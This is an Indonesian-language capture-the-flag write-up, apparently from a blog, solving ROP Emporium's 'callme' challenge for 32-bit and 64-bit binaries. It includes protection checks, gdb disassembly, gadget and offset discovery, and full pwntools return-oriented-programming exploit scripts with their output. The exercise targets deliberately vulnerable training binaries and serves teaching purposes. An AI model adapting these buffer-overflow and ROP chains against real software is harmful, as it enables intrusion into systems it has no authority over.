</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec callme32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b&#39;.&#39;
</code></pre></td></tr></table></div></div><p>Kita cek menggunakan gdb untuk menampilkan semua fungsi.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x08048650  __do_global_dtors_aux
0x08048680  frame_dummy
0x08048686  main
0x080486ed  pwnme
0x0804874f  usefulFunction
0x080487a0  __libc_csu_init
0x08048800  __libc_csu_fini
0x08048804  _fini
</code></pre></td></tr></table></div></div><p>Kita coba lakukan disassembly fungsi <em><strong>main</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
   0x080486c8 &lt;+66&gt;:	add    esp,0x10
   0x080486cb &lt;+69&gt;:	call   0x80486ed &lt;pwnme&gt;
...
...
...
</code></pre></td></tr></table></div></div><p>Pada fungsi <em><strong>main</strong></em> memanggil <em><strong>pwnme</strong></em><br>Kita lakukan disassembly fungsinya</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
... 
   0x08048731 &lt;+68&gt;:	push   eax
   0x08048732 &lt;+69&gt;:	push   0x0
   0x08048734 &lt;+71&gt;:	call   0x80484c0 &lt;read@plt&gt;
   0x08048739 &lt;+76&gt;:	add    esp,0x10
   0x0804873c &lt;+79&gt;:	sub    esp,0xc
...
...
...
</code></pre></td></tr></table></div></div><p>Pada challenge ini, untuk mendapatkan flag kita harus memasukkan 3 argumen.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag
</code></pre></td></tr></table></div></div><p>Pada <em><strong>callme_one()</strong></em> kita isi dengan 3 argumen lalu kita panggil <em><strong>callme_two()</strong></em> lalu isi 3 argumen dst.<br>Kita cari gadget pop tiga kali.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Gadgets information
============================================================
0x080487fb : pop ebp ; ret
0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ad : pop ebx ; ret
0x080487fa : pop edi ; pop ebp ; ret
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
0x08048496 : ret
0x0804861e : ret 0xeac1

Unique gadgets found: 7
</code></pre></td></tr></table></div></div><p>Kita pakai 0x080487f9.<br>Selanjutnya kita cari offset ke <em><strong>EIP</strong></em></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --&gt; offset 48 - size ~90
Pattern buffer found at:
0xf7fca6d9 : offset 33208 - size    4 (/media/ahm4d/Belajar/1 Kuliah/!github/binex/rop_emporium_all_challenges/callme32/libcallme32.so)
0xffffd0c0 : offset    0 - size  100 ($sp + -0x30 [-12 dwords])
References to pattern buffer found at:
0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])
</code></pre></td></tr></table></div></div><p>Offset 44.<br>Kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./callme32&#39;)
r = process(&#39;./callme32&#39;)
call1 = p.plt[&#39;callme_one&#39;]
call2 = p.plt[&#39;callme_two&#39;]
call3 = p.plt[&#39;callme_three&#39;]
pop3 = 0x080487f9
log.info(&#39;call1 0x%x&#39; %call1)
log.info(&#39;call2 0x%x&#39; %call2)
log.info(&#39;call3 0x%x&#39; %call3)
junk = b&#39;X&#39;*44
payload = junk
payload += p32(call1)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(call2)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(call3)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
r.sendline(payload)
r.interactive()
</code></pre></td></tr></table></div></div><p>Jalankan maka didapatkan flag</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
&gt; Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
</code></pre></td></tr></table></div></div><h3 id=callme64>callme64<a hidden class=anchor aria-hidden=true href=#callme64>#</a></h3><p>kita cek terlebih dahulu filenya.<br>Didapatkan file ELF, dan dynamically linked</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
</code></pre></td></tr></table></div></div><p>lalu kita cek proteksi pada file.<br>didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop)</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$checksec callme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b&#39;.&#39;
</code></pre></td></tr></table></div></div><p>Kita cek menggunakan gdb untuk menampilkan semua fungsi.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
</code></pre></td></tr></table></div></div><p>Setelah saya disassembly fungsi <em><strong>main dan pwnme</strong></em> sama seperti fungsi pada binary 32-bit.<br>Challenge ini sama seperti binary 32-bit diatas. yaitu untuk menampilkan flag kita harus mengisi <em><strong>callme_one, callme_two, dan callme_three</strong></em> dengan menggunakan 3 argumen.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
</code></pre></td></tr></table></div></div><p>Pada binary 64-bit ada fungsi menarik yaitu <em><strong>usefulGadgets</strong></em> dimana add 3 gadgets pop yang mana sangat berguna sekali untuk proses eksploit. daripada kita mencari secara manual.<br>Kita cari offset dahulu.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --&gt; offset 40 - size ~62
Pattern buffer found at:
0x00007ffff7fc98bb : offset 33208 - size    4 (/media/ahm4d/Belajar/1 Kuliah/!github/binex/rop_emporium_all_challenges/callme/libcallme.so)
0x00007fffffffdf40 : offset    0 - size  100 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb350 : 0x00007fffffffdf40 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf40 ($sp + -0x428 [-266 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf40 ($sp + -0x410 [-260 dwords])
</code></pre></td></tr></table></div></div><p>Offset 40.<br>Kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./callme&#39;)
r = process(&#39;./callme&#39;)
call1 = p.plt[&#39;callme_one&#39;]
call2 = p.plt[&#39;callme_two&#39;]
call3 = p.plt[&#39;callme_three&#39;]
pop3 = p.symbols[&#39;usefulGadgets&#39;]
junk = b&#39;X&#39;*40
payload = junk
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call1)
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call2)
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call3)
r.sendline(payload)
r.interactive()
</code></pre></td></tr></table></div></div><p>Jalankan maka didapatkan flag</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
&gt; Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
